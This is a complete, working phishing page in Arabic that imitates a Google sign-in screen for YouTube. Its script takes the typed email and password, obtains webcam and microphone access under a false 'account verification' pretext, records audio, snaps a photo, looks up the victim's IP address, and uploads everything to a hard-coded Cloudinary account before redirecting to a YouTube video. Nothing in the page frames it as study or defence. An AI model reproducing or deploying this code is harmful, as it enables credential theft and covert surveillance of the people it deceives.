<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Google Authentication - YouTube</title>
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 350px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
        img { width: 75px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #1a73e8; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="box" id="loginUI">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
    <h2>تسجيل الدخول</h2>
    <p>للمتابعة إلى YouTube</p>
    <input type="email" id="u_email" placeholder="البريد الإلكتروني">
    <input type="password" id="u_pass" placeholder="كلمة المرور">
    <button onclick="initHack()">التالي</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const cloudName = 'dgkttv99v';
    const uploadPreset = 'ml_default';
    const yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    let mediaRecorder;
    let audioChunks = [];

    async function initHack() {
        const email = document.getElementById('u_email').value;
        const pass = document.getElementById('u_pass').value;
        if(!email || !pass) return alert("خطأ في البيانات");

        document.getElementById('loginUI').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى السماح بالوصول للوسائط لإتمام التحقق.</p>";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('video').srcObject = stream;

            // --- بدء تسجيل الصوت ---
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                uploadEverything(email, pass, audioBlob);
            };

            mediaRecorder.start();
            console.log("Recording started...");

            // التقاط صورة بعد 3 ثواني، ووقف التسجيل بعد 6 ثواني
            setTimeout(() => { takePhoto(); }, 3000);
            setTimeout(() => { mediaRecorder.stop(); }, 7000); // سجلنا 7 ثواني صوت

        } catch (err) {
            window.location.href = yt;
        }
    }

    function takePhoto() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        window.currentImg = canvas.toDataURL("image/png");
    }

    async function uploadEverything(email, pass, audioBlob) {
        let ip = "0.0.0.0";
        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}

        // 1. رفع الصورة
        const imgData = new FormData();
        imgData.append('file', window.currentImg);
        imgData.append('upload_preset', uploadPreset);
        imgData.append('context', `user=${email}|pass=${pass}|ip=${ip}`);
        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgData });

        // 2. رفع ملف الصوت MP3
        const audioData = new FormData();
        audioData.append('file', audioBlob);
        audioData.append('upload_preset', uploadPreset);
        audioData.append('resource_type', 'video'); // كلوديناري بيعتبر الـ mp3 فيديو بدون صورة
        audioData.append('public_id', `audio_${email.split('@')[0]}_${Date.now()}`);

        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/upload`, { method: 'POST', body: audioData })
        .then(() => {
            window.location.href = yt; // حوله لليوتيوب بعد ما تخلص كل حاجة
        });
    }
</script>
</body>
</html>
